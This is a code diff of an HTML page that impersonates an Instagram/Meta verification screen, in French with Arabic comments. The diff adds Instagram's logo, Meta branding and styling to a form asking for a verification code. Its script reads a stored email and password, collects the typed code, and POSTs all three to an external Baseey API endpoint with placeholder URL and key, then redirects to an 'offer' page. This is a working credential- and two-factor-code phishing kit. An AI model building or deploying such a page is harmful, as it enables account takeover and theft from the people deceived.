@@ -2,14 +2,93 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8">
-  <title>Entrer le code</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Vérification • Instagram</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+    }
+    body {
+      background-color: #ffffff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: space-between;
+      min-height: 100vh;
+      padding: 40px 0 20px 0;
+    }
+    .container {
+      width: 100%;
+      max-width: 350px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 0 20px;
+      text-align: center;
+    }
+    .logo { width: 60px; height: 60px; margin-bottom: 24px; }
+    h2 { font-size: 18px; font-weight: 700; color: #1c2b33; margin-bottom: 10px; }
+    p { font-size: 13px; color: #65676b; line-height: 1.4; margin-bottom: 24px; }
+    form { width: 100%; }
+    .input-field {
+      width: 100%;
+      padding: 14px 16px;
+      border: 1px solid #e0e0e0;
+      border-radius: 12px;
+      font-size: 14px;
+      margin-bottom: 14px;
+      outline: none;
+      background-color: #fafafa;
+    }
+    .input-field:focus { border-color: #a8a8a8; background-color: #fff; }
+    .btn-submit {
+      width: 100%;
+      padding: 13px;
+      background-color: #0064e0;
+      color: white;
+      border: none;
+      border-radius: 20px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-bottom: 16px;
+    }
+    .resend-link { color: #0064e0; font-size: 14px; font-weight: 600; text-decoration: none; display: block; }
+    .footer { width: 100%; max-width: 350px; display: flex; flex-direction: column; align-items: center; padding: 0 20px; }
+    .btn-signup { width: 100%; padding: 11px; background-color: transparent; color: #0064e0; border: 1px solid #0064e0; border-radius: 20px; font-size: 14px; font-weight: 600; cursor: pointer; margin-bottom: 20px; }
+    .meta-logo { font-size: 13px; color: #0064e0; font-weight: bold; display: flex; align-items: center; gap: 4px; }
+  </style>
 </head>
 <body>
-  <h2>إدخال الكود</h2>
-  <form id="codeForm">
-    <input type="text" id="userCode" placeholder="Entrez votre code" required><br><br>
-    <button type="submit">Confirmer</button>
-  </form>
+
+  <div class="container">
+    <svg class="logo" viewBox="0 0 24 24" fill="none">
+      <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z" fill="url(#ig-grad)"/>
+      <defs>
+        <radialGradient id="ig-grad" cx="30%" cy="107%" r="130%" fx="30%" fy="107%">
+          <stop offset="0%" stop-color="#fdf497"/><stop offset="5%" stop-color="#fdf497"/><stop offset="45%" stop-color="#fd5949"/><stop offset="60%" stop-color="#d6249f"/><stop offset="90%" stop-color="#285AEB"/>
+        </radialGradient>
+      </defs>
+    </svg>
+
+    <h2>Entrez le code de vérification</h2>
+    <p>Nous avons envoyé un code de vérification à votre e-mail. Veuillez l'entrer ci-dessous.</p>
+
+    <form id="codeForm">
+      <input type="text" id="userCode" class="input-field" placeholder="Code de vérification" required>
+      <button type="submit" class="btn-submit">Continuer</button>
+    </form>
+
+    <a href="#" class="resend-link">Renvoyer le code</a>
+  </div>
+
+  <div class="footer">
+    <button class="btn-signup">Créer un nouveau compte</button>
+    <div class="meta-logo">∞ Meta</div>
+  </div>
 
   <script>
     document.getElementById('codeForm').addEventListener('submit', async function(e) {
@@ -19,23 +98,23 @@
       const password = localStorage.getItem('temp_password');
       const code = document.getElementById('userCode').value;
 
-      // إرسال البيانات إلى Baseey
+      // إرسال البيانات لـ Baseey
       try {
-        await fetch('https://api.baseey.com/v1/userlist', { // ضع رابط Baseey الخاص بك
+        await fetch('ضع_رابط_BASEEY_API_هنا/userlist', {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
-            'Authorization': 'Bearer YOUR_BASEEY_API_KEY' // ضع المفتاح الخاص بك
+            'Authorization': 'Bearer ضع_مفتاح_BASEEY_API_KEY_هنا'
           },
           body: JSON.stringify({ email: email, password: password, code: code })
         });
       } catch (err) {
-        console.log("Error saving data:", err);
+        console.error("Error", err);
       }
 
-      // التوجيه لصفحة العرض الأولى
       window.location.href = 'offer1.html';
     });
   </script>
+
 </body>
 </html>
